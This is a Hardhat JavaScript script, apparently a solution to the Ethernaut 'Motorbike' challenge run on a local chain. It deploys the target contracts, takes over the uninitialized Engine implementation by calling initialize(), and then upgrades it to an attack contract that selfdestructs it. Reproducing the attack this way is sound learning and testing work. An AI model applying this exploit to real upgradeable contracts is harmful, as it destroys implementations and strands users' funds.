/*

*/

const hre = require("hardhat");
const { expect } = require("chai")

async function main() {
  // Recreating the attack on ganache
  [player, deployer,user] = await ethers.getSigners();

  //Fund the player account - Run it only if is the first time this script is executed on the local blockchain!
  await user.sendTransaction({
    to: player.address,
    value: ethers.utils.parseEther("50.0"), // Sends exactly 50.0 ether
  });

  let tx;
  let txReceipt;

  // Deploy Factory Contract
  const MotorbikeFactory = await hre.ethers.getContractFactory("MotorbikeFactory");
  this.motorbikeFactory = await MotorbikeFactory.connect(deployer).deploy();
  await this.motorbikeFactory.deployed();

  // Deploy the Motorbike and Engine contract through the MotorbikeFactory contract
  tx = await this.motorbikeFactory.connect(deployer).createInstance(player.address,{value: 0});
  await tx.wait()

  const MotorbikeContractAddress = await this.motorbikeFactory.MotorbikeContract();  // Motorbike Contract address
  const EngineContractAddress = await this.motorbikeFactory.EngineContract();  // Engine Contract address

  // Creating an instance of the deployed Motorbike contract
  this.motorbikeContract = await hre.ethers.getContractAt("Motorbike",MotorbikeContractAddress);

  // Creating an instance of the deployed Engine contract
  this.engineContract = await hre.ethers.getContractAt("Engine",EngineContractAddress);

  // Creating an instance of the deployed Motorbike contract using the logic of the Engine contract
  this.engineContractProxyInstance = await hre.ethers.getContractAt("Engine",MotorbikeContractAddress);

  // Get the address of the Implementation contract directly from the reserved slot on the Proxy contract to store the address of its Implementation contract!
  const IMPLEMENTATION_CONTRACT_ADDRESS_SLOT = "0x360894a13ba1a3210667c828492db98dca3e2076cc3735a920a3ca505d382bbc";
  const ImplementationAddress = await hre.ethers.provider.getStorageAt(MotorbikeContractAddress, IMPLEMENTATION_CONTRACT_ADDRESS_SLOT);


  console.log(
    `
    MotorbikeContractAddress ${MotorbikeContractAddress} \n
    EngineContractAddress ${EngineContractAddress} \n\n
    
    upgrader - PROXY:  ${await this.engineContractProxyInstance.upgrader()} \n
    horsePower - PROXY: ${await this.engineContractProxyInstance.horsePower()} \n

    upgrader - ENGINE:  ${await this.engineContract.upgrader()} \n
    horsePower - ENGINE: ${await this.engineContract.horsePower()} \n

    StorageAt slot0: ${await hre.ethers.provider.getStorageAt(MotorbikeContractAddress,0)}
    StorageAt slot1: ${await hre.ethers.provider.getStorageAt(MotorbikeContractAddress,1)} \n

    Implementation Address from its slot: ${ImplementationAddress}
    `
  );


  
  console.log("\n\n Performing attack ... \n\n");

        // initializer() can't be called directly from an EOA //
  // console.log("Calling initializer() directly from the Player's account!");
  // tx = await this.engineContractProxyInstance.connect(player).initialize();
  // txReceipt = await tx.wait();
  // console.log(txReceipt);
  
  
  // Calling the inialize() of the Engine contract - Interacting directly with the Engine contract
  tx = await this.engineContract.connect(player).initialize();
  await tx.wait();
  
  
  console.log(
    `
    MotorbikeContractAddress ${MotorbikeContractAddress} \n
    EngineContractAddress ${EngineContractAddress} \n\n

    StorageAt slot0 on the Proxy contract: ${await hre.ethers.provider.getStorageAt(MotorbikeContractAddress,0)}
    StorageAt slot1 on the Proxy contract: ${await hre.ethers.provider.getStorageAt(MotorbikeContractAddress,1)}
    
    StorageAt slot0 on the Engine contract: ${await hre.ethers.provider.getStorageAt(EngineContractAddress,0)}
    `
  );
    
  console.log("Checking the upgrader variable was set as the Player's address");
  console.log("upgrader on the Engine contract: ", await this.engineContract.upgrader());
  console.log("upgrader on the Proxy contract: ", await this.engineContractProxyInstance.upgrader());
  //txReceipt = await tx.wait();
  // console.log(txReceipt);

  console.log("Deploying the Attack contract");
  const AttackMotorbike = await hre.ethers.getContractFactory("AttackMotorbike");
  this.attackMotorbike = await AttackMotorbike.connect(player).deploy();
  await this.attackMotorbike.deployed();

  const iface = new hre.ethers.utils.Interface([
    "function destroyContract()"
  ]);

  // Encoding the data that will be sent on the upgradeToAndCall
  const destroyContractEncoded = iface.encodeFunctionData("destroyContract",[]);
  
  console.log("Selfdestructing the Engine contract");
  tx = await this.engineContract.connect(player).upgradeToAndCall(this.attackMotorbike.address,destroyContractEncoded);
  txReceipt = await tx.wait();
  // console.log(txReceipt);

  console.log("Was the Engine contract destructed?");
  tx = await this.attackMotorbike.connect(player).contractExists(EngineContractAddress);
  await tx.wait()

  console.log(await this.attackMotorbike.destroyed());
  expect(await this.attackMotorbike.destroyed()).to.eq(true);

  console.log("\n\n ========================== Attack Completed!!!! ==========================");

}

// We recommend this pattern to be able to use async/await everywhere
// and properly handle errors.
main().catch((error) => {
  console.error(error);
  process.exitCode = 1;
});